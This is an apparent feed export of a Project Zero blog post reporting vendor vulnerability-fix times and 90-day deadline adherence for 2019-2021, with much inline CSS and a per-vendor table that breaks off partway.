https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKajtxfGAZhXanWS7kcvJozqQU2jozVQGIZdgex6_IRhp9jWHiJiL2KQddxH7Ma02d5sqhnXROh1PacqksZu3sA7-zjwh3ES8E8fQ7Jza8lu2claui1T9xYN3wrgv4J9yMFxbrUIAGiouvy4GGq-J69qROIjIITzvNpMQtJpljanHvTgd4xgrhZfRt/s72-c/image19.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-3889819885234441482
## published
10/02/2022 13:58:00
## updated
23/08/2022 15:50:56
## title
## @type
text
## #text
A walk through Project Zero metrics
## content
## @type
html
## #text
<style type="text/css">ol.lst-kix_p008n8rtcs1c-3.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-3 0}.lst-kix_sr4t049r1bof-6>li{counter-increment:lst-ctn-kix_sr4t049r1bof-6}.lst-kix_ygk8qly5wagc-7>li:before{content:"\0025cb  "}.lst-kix_p008n8rtcs1c-6>li{counter-increment:lst-ctn-kix_p008n8rtcs1c-6}.lst-kix_ygk8qly5wagc-6>li:before{content:"\0025cf  "}.lst-kix_p008n8rtcs1c-7>li{counter-increment:lst-ctn-kix_p008n8rtcs1c-7}ol.lst-kix_p008n8rtcs1c-0.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-0 0}.lst-kix_ygk8qly5wagc-8>li:before{content:"\0025a0  "}ol.lst-kix_sr4t049r1bof-1.start{counter-reset:lst-ctn-kix_sr4t049r1bof-1 0}.lst-kix_sr4t049r1bof-5>li{counter-increment:lst-ctn-kix_sr4t049r1bof-5}.lst-kix_7tz9dwqwiu1-5>li:before{content:"\0025a0  "}.lst-kix_7tz9dwqwiu1-4>li:before{content:"\0025cb  "}.lst-kix_7tz9dwqwiu1-2>li:before{content:"\0025a0  "}ul.lst-kix_ygk8qly5wagc-6{list-style-type:none}.lst-kix_sr4t049r1bof-7>li{counter-increment:lst-ctn-kix_sr4t049r1bof-7}ul.lst-kix_ygk8qly5wagc-5{list-style-type:none}.lst-kix_7tz9dwqwiu1-1>li:before{content:"\0025cb  "}.lst-kix_7tz9dwqwiu1-3>li:before{content:"\0025cf  "}ul.lst-kix_ygk8qly5wagc-8{list-style-type:none}ul.lst-kix_ygk8qly5wagc-7{list-style-type:none}ol.lst-kix_p008n8rtcs1c-6.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-6 0}ul.lst-kix_ygk8qly5wagc-2{list-style-type:none}ul.lst-kix_ygk8qly5wagc-1{list-style-type:none}ol.lst-kix_sr4t049r1bof-4.start{counter-reset:lst-ctn-kix_sr4t049r1bof-4 0}ul.lst-kix_ygk8qly5wagc-4{list-style-type:none}ul.lst-kix_ygk8qly5wagc-3{list-style-type:none}ul.lst-kix_ygk8qly5wagc-0{list-style-type:none}.lst-kix_p008n8rtcs1c-8>li{counter-increment:lst-ctn-kix_p008n8rtcs1c-8}.lst-kix_7tz9dwqwiu1-0>li:before{content:"\0025cf  "}.lst-kix_p008n8rtcs1c-5>li{counter-increment:lst-ctn-kix_p008n8rtcs1c-5}.lst-kix_sr4t049r1bof-0>li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-0,decimal) ") "}.lst-kix_rpco0oapapnv-8>li:before{content:"\0025a0  "}.lst-kix_rpco0oapapnv-7>li:before{content:"\0025cb  "}.lst-kix_sr4t049r1bof-3>li:before{content:"(" counter(lst-ctn-kix_sr4t049r1bof-3,decimal) ") "}.lst-kix_sr4t049r1bof-2>li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-2,lower-roman) ") "}.lst-kix_sr4t049r1bof-1>li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-1,lower-latin) ") "}ol.lst-kix_sr4t049r1bof-7.start{counter-reset:lst-ctn-kix_sr4t049r1bof-7 0}.lst-kix_7tz9dwqwiu1-6>li:before{content:"\0025cf  "}.lst-kix_p008n8rtcs1c-3>li{counter-increment:lst-ctn-kix_p008n8rtcs1c-3}.lst-kix_7tz9dwqwiu1-7>li:before{content:"\0025cb  "}ol.lst-kix_sr4t049r1bof-0.start{counter-reset:lst-ctn-kix_sr4t049r1bof-0 0}.lst-kix_7tz9dwqwiu1-8>li:before{content:"\0025a0  "}ol.lst-kix_p008n8rtcs1c-5.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-5 0}ol.lst-kix_sr4t049r1bof-2{list-style-type:none}ol.lst-kix_sr4t049r1bof-1{list-style-type:none}ol.lst-kix_sr4t049r1bof-0{list-style-type:none}ol.lst-kix_sr4t049r1bof-6.start{counter-reset:lst-ctn-kix_sr4t049r1bof-6 0}ol.lst-kix_p008n8rtcs1c-4.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-4 0}.lst-kix_sr4t049r1bof-7>li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-7,lower-latin) ". "}.lst-kix_sr4t049r1bof-6>li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-6,decimal) ". "}.lst-kix_sr4t049r1bof-8>li:before{content:"" counter(lst-ctn-kix_sr4t049r1bof-8,lower-roman) ". "}.lst-kix_sr4t049r1bof-0>li{counter-increment:lst-ctn-kix_sr4t049r1bof-0}.lst-kix_sr4t049r1bof-3>li{counter-increment:lst-ctn-kix_sr4t049r1bof-3}.lst-kix_sr4t049r1bof-4>li:before{content:"(" counter(lst-ctn-kix_sr4t049r1bof-4,lower-latin) ") "}.lst-kix_sr4t049r1bof-5>li:before{content:"(" counter(lst-ctn-kix_sr4t049r1bof-5,lower-roman) ") "}.lst-kix_p008n8rtcs1c-8>li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-8,lower-roman) ". "}ol.lst-kix_sr4t049r1bof-2.start{counter-reset:lst-ctn-kix_sr4t049r1bof-2 0}.lst-kix_p008n8rtcs1c-7>li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-7,lower-latin) ". "}.lst-kix_p008n8rtcs1c-4>li:before{content:"(" counter(lst-ctn-kix_p008n8rtcs1c-4,lower-latin) ") "}.lst-kix_p008n8rtcs1c-6>li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-6,decimal) ". "}.lst-kix_p008n8rtcs1c-1>li{counter-increment:lst-ctn-kix_p008n8rtcs1c-1}.lst-kix_p008n8rtcs1c-5>li:before{content:"(" counter(lst-ctn-kix_p008n8rtcs1c-5,lower-roman) ") "}ul.lst-kix_9x4uh3knfz5m-2{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-1{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-0{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-6{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-5{list-style-type:none}.lst-kix_sr4t049r1bof-1>li{counter-increment:lst-ctn-kix_sr4t049r1bof-1}ul.lst-kix_9x4uh3knfz5m-4{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-3{list-style-type:none}ol.lst-kix_sr4t049r1bof-6{list-style-type:none}ol.lst-kix_sr4t049r1bof-5{list-style-type:none}.lst-kix_p008n8rtcs1c-0>li{counter-increment:lst-ctn-kix_p008n8rtcs1c-0}ol.lst-kix_sr4t049r1bof-4{list-style-type:none}ol.lst-kix_sr4t049r1bof-3{list-style-type:none}ol.lst-kix_sr4t049r1bof-8{list-style-type:none}ol.lst-kix_sr4t049r1bof-5.start{counter-reset:lst-ctn-kix_sr4t049r1bof-5 0}ol.lst-kix_sr4t049r1bof-7{list-style-type:none}.lst-kix_p008n8rtcs1c-2>li{counter-increment:lst-ctn-kix_p008n8rtcs1c-2}.lst-kix_sr4t049r1bof-2>li{counter-increment:lst-ctn-kix_sr4t049r1bof-2}ol.lst-kix_p008n8rtcs1c-2.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-2 0}ol.lst-kix_sr4t049r1bof-8.start{counter-reset:lst-ctn-kix_sr4t049r1bof-8 0}ul.lst-kix_9x4uh3knfz5m-8{list-style-type:none}ul.lst-kix_9x4uh3knfz5m-7{list-style-type:none}.lst-kix_rpco0oapapnv-1>li:before{content:"\0025cb  "}ul.lst-kix_7tz9dwqwiu1-5{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-6{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-7{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-8{list-style-type:none}.lst-kix_rpco0oapapnv-2>li:before{content:"\0025a0  "}ul.lst-kix_7tz9dwqwiu1-1{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-2{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-3{list-style-type:none}ul.lst-kix_7tz9dwqwiu1-4{list-style-type:none}.lst-kix_rpco0oapapnv-3>li:before{content:"\0025cf  "}ul.lst-kix_7tz9dwqwiu1-0{list-style-type:none}.lst-kix_rpco0oapapnv-4>li:before{content:"\0025cb  "}.lst-kix_rpco0oapapnv-6>li:before{content:"\0025cf  "}.lst-kix_rpco0oapapnv-5>li:before{content:"\0025a0  "}.lst-kix_9x4uh3knfz5m-7>li:before{content:"\0025cb  "}.lst-kix_9x4uh3knfz5m-8>li:before{content:"\0025a0  "}.lst-kix_9x4uh3knfz5m-5>li:before{content:"\0025a0  "}.lst-kix_9x4uh3knfz5m-3>li:before{content:"\0025cf  "}.lst-kix_9x4uh3knfz5m-4>li:before{content:"\0025cb  "}ol.lst-kix_p008n8rtcs1c-8.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-8 0}.lst-kix_9x4uh3knfz5m-2>li:before{content:"\0025a0  "}.lst-kix_sr4t049r1bof-4>li{counter-increment:lst-ctn-kix_sr4t049r1bof-4}.lst-kix_p008n8rtcs1c-4>li{counter-increment:lst-ctn-kix_p008n8rtcs1c-4}.lst-kix_rpco0oapapnv-0>li:before{content:"\0025cf  "}.lst-kix_sr4t049r1bof-8>li{counter-increment:lst-ctn-kix_sr4t049r1bof-8}.lst-kix_9x4uh3knfz5m-6>li:before{content:"\0025cf  "}ul.lst-kix_rpco0oapapnv-6{list-style-type:none}ul.lst-kix_rpco0oapapnv-7{list-style-type:none}ul.lst-kix_rpco0oapapnv-8{list-style-type:none}ul.lst-kix_rpco0oapapnv-2{list-style-type:none}ul.lst-kix_rpco0oapapnv-3{list-style-type:none}ol.lst-kix_p008n8rtcs1c-0{list-style-type:none}ul.lst-kix_rpco0oapapnv-4{list-style-type:none}ul.lst-kix_rpco0oapapnv-5{list-style-type:none}ol.lst-kix_sr4t049r1bof-3.start{counter-reset:lst-ctn-kix_sr4t049r1bof-3 0}ol.lst-kix_p008n8rtcs1c-7.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-7 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_ygk8qly5wagc-4>li:before{content:"\0025cb  "}.lst-kix_9x4uh3knfz5m-0>li:before{content:"\0025cf  "}.lst-kix_ygk8qly5wagc-3>li:before{content:"\0025cf  "}.lst-kix_ygk8qly5wagc-5>li:before{content:"\0025a0  "}.lst-kix_p008n8rtcs1c-0>li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-0,decimal) ") "}.lst-kix_p008n8rtcs1c-2>li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-2,lower-roman) ") "}.lst-kix_9x4uh3knfz5m-1>li:before{content:"\0025cb  "}.lst-kix_p008n8rtcs1c-3>li:before{content:"(" counter(lst-ctn-kix_p008n8rtcs1c-3,decimal) ") "}.lst-kix_ygk8qly5wagc-0>li:before{content:"\0025cf  "}ol.lst-kix_p008n8rtcs1c-2{list-style-type:none}ol.lst-kix_p008n8rtcs1c-1{list-style-type:none}.lst-kix_ygk8qly5wagc-1>li:before{content:"\0025cb  "}ol.lst-kix_p008n8rtcs1c-4{list-style-type:none}ul.lst-kix_rpco0oapapnv-0{list-style-type:none}ol.lst-kix_p008n8rtcs1c-3{list-style-type:none}ul.lst-kix_rpco0oapapnv-1{list-style-type:none}.lst-kix_ygk8qly5wagc-2>li:before{content:"\0025a0  "}ol.lst-kix_p008n8rtcs1c-6{list-style-type:none}ol.lst-kix_p008n8rtcs1c-5{list-style-type:none}ol.lst-kix_p008n8rtcs1c-8{list-style-type:none}.lst-kix_p008n8rtcs1c-1>li:before{content:"" counter(lst-ctn-kix_p008n8rtcs1c-1,lower-latin) ") "}ol.lst-kix_p008n8rtcs1c-1.start{counter-reset:lst-ctn-kix_p008n8rtcs1c-1 0}ol.lst-kix_p008n8rtcs1c-7{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c6{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:112.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c3{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:60pt;border-top-color:#cccccc;border-bottom-style:solid}.c32{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:33pt;border-top-color:#cccccc;border-bottom-style:solid}.c28{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:93.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c21{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:115.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c12{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:90.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c16{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:74.2pt;border-top-color:#cccccc;border-bottom-style:solid}.c14{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:96.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c10{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:57.8pt;border-top-color:#cccccc;border-bottom-style:solid}.c23{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:49.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c15{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:75pt;border-top-color:#cccccc;border-bottom-style:solid}.c5{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:top;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:93pt;border-top-color:#cccccc;border-bottom-style:solid}.c25{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:top;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:96pt;border-top-color:#cccccc;border-bottom-style:solid}.c19{border-right-style:solid;padding:2pt 2pt 2pt 2pt;border-bottom-color:#cccccc;border-top-width:1pt;border-right-width:1pt;border-left-color:#cccccc;vertical-align:bottom;border-right-color:#cccccc;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:73.5pt;border-top-color:#cccccc;border-bottom-style:solid}.c22{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Arial";font-style:italic}.c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:10pt}.c11{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c33{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:13pt;font-family:"Arial";font-style:normal}.c31{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:15pt;font-family:"Arial";font-style:normal}.c4{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Arial";font-style:normal}.c29{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c27{padding-top:0pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.0;orphans:2;widows:2;text-align:right}.c26{color:#000000;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Arial";font-style:normal}.c42{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:"Arial"}.c8{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c9{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c13{border-spacing:0;border-collapse:collapse;margin-right:auto}.c17{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.c34{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c30{margin-left:36pt;padding-left:0pt}.c41{padding:0;margin:0}.c20{color:inherit;text-decoration:inherit}.c39{font-size:9pt}.c24{height:0pt}.c18{height:15.8pt}.c35{height:10pt}.c36{height:28.5pt}.c40{height:17.2pt}.c37{font-style:italic}.c7{font-weight:700}.c38{height:39.8pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:10pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:10pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:15pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:13pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c34">
 <p class="c8"><span class="c4">Posted by Ryan Schoen, Project Zero</span></p><h1 class="c29" id="h.xo66zodpzj4v"><span class="c31">tl;dr</span></h1><ul style="padding: 0;" class="c41 lst-kix_rpco0oapapnv-0 start"><li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"><span class="c4">In 2021, vendors took an average of 52 days to fix security vulnerabilities reported from Project Zero. This is a significant acceleration from an average of about 80 days 3 years ago.</span></li><li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"><span>In addition to the average now being well below the </span><span class="c17"><a class="c201" href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html">90-day deadline</a></span><span>, we have also seen a dropoff in vendors missing the deadline (or the additional </span><span class="c17"><a class="c201" href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html#deadlinemiss">14-day grace period</a></span><span>). </span><span>In 2021, only one bug exceeded its fix deadline, though 14% of bugs required the grace period.</span></li><li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"><span class="c4">Differences in the amount of time it takes a vendor/product to ship a fix to users reflects their product design, development practices, update cadence, and general processes towards security reports. We hope that this comparison can showcase best practices, and encourage vendors to experiment with new policies.</span></li><li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"><span>This </span><span>data</span><span class="c4">&nbsp;aggregation and analysis is relatively new for Project Zero, but we hope to do it more in the future. We encourage all vendors to consider publishing aggregate data on their time-to-fix and time-to-patch for externally reported vulnerabilities, as well as more data sharing and transparency in general.</span></li></ul>
 <p class="c2"><span class="c4"></span></p><h1 class="c29" id="h.pta8ps9u6b3h"><span class="c31">Overview</span></h1>
 <p class="c8"><span>For nearly ten years, Google&rsquo;s Project Zero has been working to </span><span>make it more difficult for bad actors to find and </span><span class="c4">exploit security vulnerabilities, significantly improving the security of the Internet for everyone. In that time, we have partnered with folks across industry to transform the way organizations prioritize and approach fixing security vulnerabilities and updating people&rsquo;s software.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span>To help contextualize the shifts we are seeing the ecosystem make, we </span><span>looked back at the set of vulnerabilities Project Zero has been reporting, how a range of vendors have been responding to them, and then attempted to identify trends in this </span><span>data</span><span>, such as how the industry as a whole is patching vulnerabilities faster.</span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span>For this post, we look at fixed bugs that were reported between January 2019 and December 2021 </span><span class="c37">(2019 is the year we made changes to our disclosure policies and also began recording more detailed metrics on our reported bugs).</span><span>&nbsp;The data we&#39;ll be referencing is publicly available on the </span><span class="c17"><a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/list">Project Zero Bug Tracker</a></span><span class="c4">, and on various open source project repositories (in the case of the data used below to track the timeline of open-source browser bugs). </span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c4">There are a number of caveats with our data, the largest being that we&#39;ll be looking at a small number of samples, so differences in numbers may or may not be statistically significant. Also, the direction of Project Zero&#39;s research is almost entirely influenced by the choices of individual researchers, so changes in our research targets could shift metrics as much as changes in vendor behaviors could. As much as possible, this post is designed to be an objective presentation of the data, with additional subjective analysis included at the end.</span></p><h1 class="c29" id="h.1d9pvkaiez8g"><span class="c31">The data!</span></h1>
 <p class="c8"><span>Between 2019 and 2021, Project Zero reported </span><span class="c17"><a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/list?sort=id&colspec=ID%20Status%20Restrict%20Finder%20Reported%20Deadline%20Remaining%20CVE%20Vendor%20Product%20Summary&q=status%21%3DInvalid%20id%3E%3D1748%20id%3C%3D2248%20Deadline%3A90&can=1">376 issues</a></span><span>&nbsp;to vendors under our standard 90-day deadline. 351 (93.4%) of these bugs have been fixed, while 14 (3.7%) have been marked </span><span>as WontFix by the vendor</span><span>s. </span><span>11 (2.9%) other bugs remain unfixed, though at the time of this writing 8 have passed their deadline to be fixed; the remaining 3 are still within their deadline to be fixed.</span><span>&nbsp;Most of the vulnerabilities are clustered around a few vendors, with 96 bugs (26%) being reported to </span><span>Microsoft, 85 (23%) to Apple, and 60 (16%) to Google. </span></p><h1 class="c29" id="h.sv8ualubd8u5"><span class="c31">Deadline adherence</span></h1>
 <p class="c8"><span>Once a vendor receives a bug report under</span><span>&nbsp;</span><span class="c4">our standard deadline, they have 90 days to fix it and ship a patched version to the public. The vendor can also request a 14-day grace period if the vendor confirms they plan to release the fix by the end of that total 104-day window. </span></p>
 <p class="c2"><span class="c4"></span></p>
 <p class="c8"><span class="c4">In this section, we&#39;ll be taking a look at how often vendors are able to hit these deadlines. The table below includes all bugs that have been reported to the vendor under the 90-day deadline since January 2019 and have since been fixed, for vendors with the most bug reports in the window.</span></p><h3 class="c11" id="h.fg01dvnui56v"><span class="c33">Deadline adherence and fix time 2019-2021, by bug report volume</span></h3><a id="t.329fd0452dc36b64883666563f4a8e1faf166602"></a><a id="t.0"></a><table class="c13"><tbody><tr class="c38"><td class="c23" colspan="1" rowspan="1">
 <p class="c9"><span class="c7">Vendor</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c7">Total bugs</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c7">Fixed by day 90</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c7">Fixed during<br>grace period</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c26 c7">Exceeded deadline</span></p>
 <p class="c1"><span class="c7">&amp; grace period</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c7">Avg days to fix</span></p></td></tr><tr class="c18"><td class="c23" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">Apple</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">84</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">73 (87%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">7 (8%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">4 (5%)</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">69</span></p></td></tr><tr class="c18"><td class="c23" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">Microsoft</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">80</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">61 (76%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">15 (19%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">4 (5%)</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">83</span></p></td></tr><tr class="c18"><td class="c23" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">Google</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">56</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">53 (95%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">2 (4%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">1 (2%)</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">44</span></p></td></tr><tr class="c18"><td class="c23" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">Linux</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">25</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">24 (96%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">0 (0%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">1 (4%)</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">25</span></p></td></tr><tr class="c18"><td class="c23" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">Adobe</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">19</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">15 (79%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">4 (21%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">0 (0%)</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">65</span></p></td></tr><tr class="c18"><td class="c23" colspan="1" rowspan="1">
 <p class="c9"><span class="c4">Mozilla</span></p></td><td class="c10" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">10</span></p></td><td class="c12" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">9 (90%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">1 (10%)</span></p></td><td class="c14" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">0 (0%)</span></p></td><td class="c16" colspan="1" rowspan="1">
 <p class="c1"><span class="c4">46</span></p></td></tr><tr class="c18"><td class="c23" colspan="1" rowspan="1">
